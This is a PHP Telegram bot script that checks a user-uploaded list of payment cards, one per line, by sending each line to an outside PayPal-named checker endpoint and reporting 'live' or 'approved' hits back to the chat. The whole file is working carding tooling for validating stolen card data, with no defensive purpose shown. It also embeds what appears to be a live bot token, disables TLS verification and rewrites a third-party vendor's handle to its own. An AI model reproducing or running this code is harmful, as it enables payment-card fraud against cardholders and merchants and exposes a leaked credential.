
<?php

$botToken = '8310617057:AAH22wb_CR4JI_pGWh7bkjiL1hP6UrcgSaM'; // Replace with your actual bot token
$apiURL = "https://api.telegram.org/bot$botToken/";

// Read Telegram input
$input = file_get_contents("php://input");
$update = json_decode($input, true);

// Approval keywords to identify hits
$approvalKeywords = ['LIVE', 'APPROVED', 'CARD ADDED', 'ADDED', 'SUCCESS', 'CHARGED', 'AUTH'];

// Helper function to send or edit a message
function sendMessage($chat_id, $text, $message_id = null) {
    global $apiURL;
    $params = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];

    $url = $apiURL . ($message_id ? "editMessageText" : "sendMessage");
    if ($message_id) $params['message_id'] = $message_id;

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res, true);
}

// Get chat ID
$chat_id = $update['message']['chat']['id'] ?? null;

// Only handle .txt document uploads
if (isset($update['message']['document'])) {
    $file_id = $update['message']['document']['file_id'];
    $file_name = $update['message']['document']['file_name'];

    // Optional: check if it's a .txt file
    if (!str_ends_with(strtolower($file_name), '.txt')) {
        sendMessage($chat_id, "❌ Please upload a valid .txt file.");
        exit;
    }

    // Step 1: Get file path
    $filePathResp = file_get_contents($apiURL . "getFile?file_id=" . $file_id);
    $filePath = json_decode($filePathResp, true)['result']['file_path'];

    // Step 2: Download the file
    $fileContent = file_get_contents("https://api.telegram.org/file/bot$botToken/$filePath");

    // Step 3: Split lines
    $lines = array_filter(array_map('trim', explode("\n", $fileContent)));
    $dead = 0;
    $hits = 0;

    // Send initial status message
    $statusMsg = sendMessage($chat_id, "📥 Checking...\n✅ Hits: $hits\n❌ Dead: $dead");
    $statusMsgId = $statusMsg['result']['message_id'];

    foreach ($lines as $line) {
        $url = "https://wizvenex.com/Paypal.php?lista=" . urlencode($line);

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);

        $clean = strip_tags($result);
        $clean = str_replace("@VENEX444", "@STARBOYWTF", $clean);

        // Check for hit
        $isHit = false;
        foreach ($approvalKeywords as $keyword) {
            if (stripos($clean, $keyword) !== false) {
                $isHit = true;
                break;
            }
        }

        if ($isHit) {
            $hits++;
            sendMessage($chat_id, "✅ HIT\n<code>$line</code>\n$clean");
        } else {
            $dead++;
        }

        // Edit original status message only
        sendMessage($chat_id, "📥 Checking...\n✅ Hits: $hits\n❌ Dead: $dead", $statusMsgId);
        usleep(300000); // Delay 0.3 sec
    }
}

// If message is anything else (text, photo, etc.)
else {
    sendMessage($chat_id, "📄 Please upload a <b>.txt</b> file containing one card per line.");
}

